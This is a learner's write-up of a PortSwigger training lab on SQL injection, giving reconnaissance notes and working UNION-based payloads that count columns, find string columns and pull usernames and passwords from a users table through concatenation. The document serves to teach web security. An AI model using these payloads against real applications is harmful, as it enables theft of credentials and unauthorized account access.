# SQL injection UNION attack, retrieving multiple values in a single column

**Category:** Web Exploitation — SQL Injection  
**Difficulty:** Practitioner
**Progress:** Solved

---

## Description

**Lab URL:** `https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column`


This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password as per the labs instructions.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

Hint: You can find some useful payloads on our SQL injection cheat sheet. 

---

## Reconnaissance

- What does the application do? 
    - Still the same basic shop website
- Where is user input accepted? (forms, URL parameters, headers, cookies)
    - there is no input field (except for the account login) but the user can input text into the url
- What happens with normal input?
    - inputting a normal word instead of the given categories prints the word on the page and shows no results, inputting the given categories works like it should

---

## Analysis

#### Technology Stack
```
Database:   oracle/postgreSQL (`||` works as concatenation)
Input:      URL
Behavior:   union based sql injection
```

#### Vulnerability

- What exactly is vulnerable and why?
    
As per the lab instructions the category filter is vulnerable. 
It probably looks like this:
```sql
SELECT * FROM products WHERE category = '[input]'
```
To use an actual UNION attack we need to first find out how many columns are returned by this query. Then we need to check which columns contain a string. If there are two strings right after each other we can select username and password from the user table.

---

## Solution

### Step 1 - Craft payload
Since typing all of that into the url and waiting for the website to load is annoying, using the inbuilt repeater function of burp suite is a must here. 

To find the number of columns we can use the ORDER BY method.
```sql
category=' ORDER BY 2--
```
is the last one that does not throw an error.
Now check for the strings.

```sql
category=' UNION SELECT null, 'a'--
``` 
works.

---
### Step 2 - Extract / Exploit

So there are two coloumns, the second one contains strings. The table users contains usernames and passwords (both strings). Time to concatenate them

```sql
category=' UNION SELECT null, username|| '~' || password from users--
```


Returns the following accounts:
![accounts](assets/users-and-passwords-concatenated.png)

Another solution if the concatenation does not work for whatever reason:
```sql
category=' UNION SELECT null, username from users--
```
to get the usernames.
```sql
category=' UNION SELECT null, password from users--
```
to get the passwords.

---

## Real World Impact

Another full attack shown. Same impact as in last lab, potentially business-ending. 

---

## Learnings

- Again - going step by step is important. Rushing things makes even the simplest exploits tricky.
- Concatenation can solve probems with the column count reliably. So UNION attacks are not reliant on the perfect exploitable database all the time.